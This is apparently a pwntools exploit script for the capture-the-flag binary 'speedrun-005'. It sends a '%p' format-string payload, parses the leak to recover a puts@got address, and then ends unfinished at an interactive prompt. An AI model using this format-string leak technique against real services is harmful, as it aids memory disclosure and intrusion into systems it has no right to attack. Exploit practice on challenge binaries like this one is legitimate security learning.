#!/usr/bin/env python3

from pwn import *

exe = ELF("./speedrun-005")

for (k,v) in exe.got.items():
    print((k, hex(v)))

context.binary = exe

LOCAL=1

def conn():
    if LOCAL:
        return gdb.debug([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()
    r.sendline("%p " * 4)

    chaff = r.recvuntil("Interesting ")
    print("<Ignored:> ", chaff)
    line = r.recv(32)
    print("Full line: ", line)
    print("Full line hex: ", "".join(format(x, '02x') for x in line))
    addr = line[3:8]
    data = reversed(addr);
    print ("Got data for puts@got:")
    print ('0x' + (''.join(format(x, '02x') for x in data)))

    rest = r.recvuntil("thought")
    print("<Ignored:>", rest)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
